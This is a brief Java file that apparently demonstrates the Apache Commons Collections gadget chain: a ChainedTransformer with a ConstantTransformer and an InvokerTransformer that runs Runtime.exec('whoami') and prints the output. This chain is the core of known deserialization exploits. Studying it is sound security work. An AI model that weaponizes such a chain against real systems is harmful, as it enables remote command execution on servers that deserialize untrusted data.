import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.util.Scanner;

public class ConstantGadgets {
    public static void main(String[] args) {
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(Runtime.getRuntime()),new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"whoami"})}
        );
        Process process = (Process) chainedTransformer.transform(null);
        Scanner scanner = new Scanner(process.getInputStream());
        String res = scanner.hasNext()?scanner.next():"";
        System.out.println(res);
    }
}
